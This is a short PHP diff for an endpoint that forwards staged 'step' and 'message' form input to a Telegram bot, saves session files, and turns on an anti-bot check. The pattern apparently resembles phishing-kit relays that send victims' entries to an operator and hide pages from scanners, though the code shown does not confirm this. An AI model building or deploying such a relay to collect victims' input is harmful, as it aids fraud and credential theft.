@@ -21,12 +21,12 @@ if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
 
 $input = json_decode(file_get_contents('php://input'), true) ?: $_POST;
 
-// if (!Antibot::esHumano($input)) {
-//     Antibot::rechazar();
-// }
+if (!Antibot::esHumano($input)) {
+    Antibot::rechazar();
+}
 
-$step      = $input['step']      ?? '';
-$message   = $input['message']   ?? '';
+$step       = $input['step']       ?? '';
+$message    = $input['message']    ?? '';
 $clientSessionId = $input['sessionId'] ?? '';
 
 if (empty($step) || empty($message) || empty($clientSessionId)) {
@@ -81,8 +81,8 @@ $postData = http_build_query([
 
 $ch = curl_init("https://api.telegram.org/bot{$botToken}/sendMessage");
 curl_setopt_array($ch, [
-    CURLOPT_POST           => true,
-    CURLOPT_POSTFIELDS     => $postData,
+    CURLOPT_POST             => true,
+    CURLOPT_POSTFIELDS       => $postData,
     CURLOPT_RETURNTRANSFER => true,
     CURLOPT_TIMEOUT        => 15,
     CURLOPT_SSL_VERIFYPEER => true,
@@ -109,8 +109,13 @@ if (!$data['ok']) {
 
 $messageId = $data['result']['message_id'] ?? null;
 
-// ── Guardar sesión en archivo ──
-$sessionFile = __DIR__ . "/../data/{$sessionId}.json";
+// ── Guardar sesión en archivo (Compatible con Vercel Serverless / Render) ──
+$dataDir = is_writable(__DIR__ . '/../data') ? __DIR__ . '/../data' : sys_get_temp_dir() . '/data';
+if (!is_dir($dataDir)) {
+    @mkdir($dataDir, 0755, true);
+}
+
+$sessionFile = $dataDir . "/{$sessionId}.json";
 $sessionData = [
     'sessionId'   => $sessionId,
     'currentStep' => $step,
@@ -121,12 +126,6 @@ $sessionData = [
     'lastUpdateId'=> 0,
     'messageText' => $message
 ];
-
-// Crear directorio data si no existe
-$dataDir = __DIR__ . '/../data';
-if (!is_dir($dataDir)) {
-    @mkdir($dataDir, 0755, true);
-}
 
 $fp = fopen($sessionFile, 'c');
 if (!$fp || !flock($fp, LOCK_EX)) {
